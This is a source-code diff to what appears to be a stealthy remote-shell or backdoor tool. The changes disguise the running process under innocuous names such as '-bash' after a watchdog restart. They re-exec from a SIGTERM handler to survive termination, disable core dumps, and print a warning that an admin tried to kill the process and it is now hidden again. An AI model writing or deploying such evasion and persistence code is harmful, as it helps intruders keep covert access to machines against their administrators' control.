@@ -293,7 +293,7 @@ err:
 	return fret;
 }
 
-// STOP ptrace() of my self.
+// STOP ptrace() of myself.
 // - FIXME: Ulg. Any signal to this process (like TERM or SIG_CHLD) will stop this process,
 //   This would make it non-functional.
 // static void
@@ -318,7 +318,13 @@ changeargv0_finish(void) {
 	if (strcmp(gopt.prg_name, GSNC_PROC_HN_SIGTERM) == 0)
 		gopt.flags |= GSC_FL_SWD_SURVIVED_SIGTERM;
 
-	DEBUGF("Now hidden as prg_name=%s [orig EXENAME=%s]\n", gopt.prg_name, gopt.prg_exename);
+	if (gopt.flags & GSC_FL_STARTED_BY_SWD) {
+		// Keep the argv that the watchdog gave us. Might be '-bash' if we received
+		// a SIGTERM.
+		gopt.proc_hiddenname = gopt.prg_name;
+	}
+
+	DEBUGF("Now hidden as gopt.prg_name=%s [orig EXENAME=%s]\n", gopt.prg_name, gopt.prg_exename);
 	// SEAL after config had been read.
 #ifdef PR_SET_DUMPABLE
 	prctl(PR_SET_DUMPABLE, 0);
@@ -524,10 +530,8 @@ init_defaults1(int argc, char *argv[]) {
 		return;
 
 	gopt.prg_name = argv0;
-	if (argv0 != NULL) {
-		char *ptr;
-		ptr = strrchr(argv0, '/');
-		if (ptr != NULL)
+	if (gopt.prg_name != NULL) {
+		if ((ptr = strrchr(gopt.prg_name, '/')) != NULL)
 			gopt.prg_name = ptr + 1;
 	}
 	gopt.prg_name = strdup(gopt.prg_name?:"NULL");
@@ -626,10 +630,9 @@ gs_create(void)
 
 static void
 cb_sigterm(int sig) {
-	DEBUGF("SIGTERM received\n");
 	sv_sigforward(sig);
 	gopt.exit_code = EX_SIGTERM;
-	exit(EX_SIGTERM);	// will call cb_atexit()
+	exit(EX_SIGTERM);	// will call cb_atexit(). May fork & exit.
 }
 
 void
@@ -787,9 +790,15 @@ init_vars(void)
 	if ((gopt.is_interactive && !(gopt.flags & GSC_FL_IS_SERVER) && !gopt.is_stdin_a_tty))
 		gopt.is_stdin_ignore_eof = 1;
 
-	DEBUGF("MARK foobar before signal()\n");
+	// We fork & execve from a signal handler. This means Linux
+	// will never see us return from this handler. It will keep
+	// blocking the signal. Need to unblock:
+	sigset_t cur;
+	sigemptyset(&cur);
+	sigaddset(&cur, SIGTERM);
+	sigaddset(&cur, SIGSEGV);
+	sigprocmask(SIG_UNBLOCK, &cur, NULL);
 	signal(SIGTERM, cb_sigterm);
-	DEBUGF("After signal(), swd=%d\n", gopt.flags & GSC_FL_STARTED_BY_SWD);
 }
 
 void
@@ -1271,7 +1280,7 @@ mk_shellname(const char *shell, char *shell_name, ssize_t len, const char **prgn
 		// Set PRGNAME unless it's a link (BusyBox etc), which relies on the original argv0
 		if (lstat(shell, &st) == 0) {
 			if (!S_ISLNK(st.st_mode))
-				*prgname = gopt.prg_name; // HIDE as prg_name
+				*prgname = gopt.proc_hiddenname; // HIDE as prg_name
 		}
 	}
 	
@@ -1281,97 +1290,6 @@ mk_shellname(const char *shell, char *shell_name, ssize_t len, const char **prgn
 
 	return shell;
 }
-
-/*
- * Create an envp list from existing env. This is a hack for cmd-execution.
- * 'blacklist' contains env-vars which should not be part of the new
- * envp for the shell (such as STY, a screen variable, which we must remove).
- * 'addlist' contains env-vars that should be added _if_ they do not yet
- * exist.
- *
- * If blacklist and addlist contain the same variable then that variable
- * will be replaced with the one from addlist.
- */
-// char **
-// mk_env(char **blacklist, char **addlist)
-// {
-// 	char **env;
-// 	int total = 0;
-// 	int add_total = 0;
-// 	int i;
-// 	char *end;
-// 	int n;
-
-// 	for (i = 0; environ[i] != NULL; i++)
-// 		total++;
-
-// 	for (i = 0; addlist[i] != NULL; i++)
-// 		add_total++;
-
-// 	// DEBUGF("Number of environment variables: %d (calloc(%d, %zu)\n", total, total + 1, sizeof *env);
-// 	env = calloc(total + add_total + 1, sizeof *env);
-
-// 	/* Copy to env unless variable is in blacklist */
-// 	int ii = 0;
-// 	for (i = 0; i < total; i++)
-// 	{
-// 		char *s = environ[i];
-
-// 		/* Check if we want this env variable and continue if not */
-// 		end = strchr(s, '=');
-// 		if (end == NULL)
-// 			continue;			// Illegal enviornment variable
-// 		/* Check if the env is in the BLACK list */
-// 		char **b = blacklist;
-// 		for (; *b != NULL; b++)
-// 		{
-// 			if (end - s > strlen(*b))
-// 				continue;
-// 			if (memcmp(s, *b, end - s) == 0)
-// 				break;			// In the blacklist
-// 		}
-// 		if (*b != NULL)
-// 			continue;			// Skip if in blacklist
-
-// 		env[ii] = strdup(s);
-// 		ii++;
-// 	}
-
-// 	/* Append to env unless variable is already in env */
-// 	int env_len = ii;
-// 	int should_add;
-// 	for (n = 0; addlist[n] != NULL; n++)
-// 	{
-// 		char *al_end = strchr(addlist[n], '=');
-// 		if (al_end == NULL)
-// 			continue;
-
-// 		should_add = 1;
-// 		for (i = 0; i < env_len; i++)
-// 		{
-// 			char *s = env[i];
-// 			end = strchr(s, '=');
-// 			if (end == NULL)
-// 				continue;
-// 			if (al_end - addlist[n] != end - s)
-// 				continue;
-// 			if (memcmp(s, addlist[n], end - s) == 0)
-// 			{
-// 				should_add = 0;
-// 				break;	// Already in this list
-// 			}
-// 		}
-// 		if (should_add != 0)
-// 		{
-// 			// DEBUGF_C("Adding %s\n", addlist[n]);
-// 			env[ii] = strdup(addlist[n]);
-// 			ii++;
-// 		}
-
-// 	}
-
-// 	return env;
-// }
 
 static void
 setup_cmd_child(int except_fd)
@@ -1699,7 +1617,7 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
 		if (gopt.flags & GSC_FL_SWD_SURVIVED_SIGTERM)
-			printf("="CDR"WARNING"CN"        : Admin tried to SIGTERM us. Now hidden as "CDY GSNC_PROC_HN_SIGTERM CN"\n");
+			printf("="CDR"WARNING"CN"        : Admin tried to SIGTERM us. Now hidden as '"CDY GSNC_PROC_HN_SIGTERM CN"'\n");
 	}
 
 	char *ptr = gopt.prg_exename;
